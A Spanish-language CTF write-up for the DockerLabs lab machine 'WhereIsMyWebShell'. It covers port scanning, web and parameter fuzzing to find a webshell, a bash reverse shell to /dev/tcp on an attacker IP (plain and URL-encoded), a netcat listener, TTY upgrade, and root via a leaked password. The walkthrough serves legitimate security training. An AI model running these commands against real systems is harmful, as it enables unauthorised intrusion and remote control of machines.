Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "WhereIsMyWebShell".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh whereismywebshell.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.18.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene unicamente un puerto abierto, el puerto 80 (HTTP):
```
Discovered open port 80/tcp on 172.17.0.2
```
Siendo asi, pasamos a introducir la direccion IP en el navegador para ver que obtenemos y vemos una pagina de una academia de ingles, donde vemos que al final hay un pequeño mensaje:
```
¡Contáctanos hoy mismo para más información sobre nuestros programas de enseñanza de inglés!. Guardo un secretito en /tmp ;)
```
De momento no tenemos mas informacion, por lo que vamos a hacer un poco de FUZZING WEB:
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html
```
y obtenemos la siguiente informacion:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 622929 / 622932 (100.00%)
```
Probamos con la pagina "/warning.html" y vemos el siguiente mensaje por pantalla:
```
Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
```
Tambien tenemos el "/shell.php" pero al colocarlo en el navegador, solo podemos ver una pagina en blanco.
Es momento de usar "wfuzz" para intentar buscar la palabra que deberiamos colocar detras de "/shell.php" y poder ejecutar comandos, por lo que escribimos:
```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id" --hc 404 --hl 0 -t 50
```
Y tras un ratito nos encuentra la palabra "parameter" tal y como se puede observar abajo:
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                  =====================================================================

000115401:   200        2 L      4 W        66 Ch       "parameter"
```
Probamos a poner "http://172.17.0.2/shell.php?parameter=id" y recibimos la siguiente respuesta por la web:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Con esto podemos ver que ya tenemos la ejecucion remota de comandos.

Bien, vamos a intentar hacer una reverse shell, por lo que con NETCAT nos pondremos a la escucha por el puerto 443, por ejemplo:
```
nc -nlvp 443
```
pero antes de nada, vamos a intentar pasar a formato web (urlcodear) el siguiente comando obtenido de la pagina "https://www.revshells.com/" para conseguir nuestra reverse:
```
bash -c "sh -i >& /dev/tcp/172.17.0.1/443 0>&1"
```
Para hacer esto, la propia pagina nos permite pasar dicho comando a formato "URL Encode", abajo a la derecha, y donde nos quedaria:
```
bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261"
```
Con esto hemos obtenido ya la reverse shell y con ello, el acceso a la maquina victima. De todas formas, ahora es momento de hacer un tratamiento de la tty:
```
1) Escribimos:
	script /dev/null -c bash
2) Ahora pulsamos (CTRL + Z) y nos devuele a la terminal de la maquina atacante
3) Escribimos:
	stty raw -echo; fg
4) Una vez escrito lo anterior y vuelto a la maquina victima, escribimos:
	reset xterm
5) Finalmente, escribimos estos dos comandos:                    
    export TERM=xterm
    export SHELL=bash
6) Nos quedaria la terminal de la siguiente forma:
	www-data@c306b3822817:/var/www/html$ 
```
Ahora, lo suyo seria ir a la carpeta "/temp" que nos decia la pagina principal de la academia en el mensajito de abajo del todo, para ver cual era ese "secretito".
```
www-data@c306b3822817:/var/www/html$ cd /tmp
```
Y al lanzar un "ls -la", vemos:
```
www-data@c306b3822817:/tmp$ ls -la

total 12
drwxrwxrwt 1 root root 4096 Jul 16 21:27 .
drwxr-xr-x 1 root root 4096 Jul 16 21:27 ..
-rw-r--r-- 1 root root   21 Apr 12 16:07 .secret.txt

www-data@c306b3822817:/tmp$ 
```
Es momento de hacer un "cat" a ver lo que hay en ".secret.txt":
```
www-data@c306b3822817:/tmp$ cat .secret.txt 
contraseñaderoot123

www-data@c306b3822817:/tmp$ 
```
Ya teniendo la contraseña, vemos que hemos conseguido acceso "root" al cambiar a dicho usuario tal y como se observa aqui abajo:
```
www-data@c306b3822817:/tmp$ su root
Password:       <==== Metemos la contraseña que habia en ".secret.txt"

root@c306b3822817:/tmp# whoami
root            <==== Vemos que somos finalmente "root"

root@c306b3822817:/tmp# 
```
Y con esto, la maquina estaria terminada :) !!
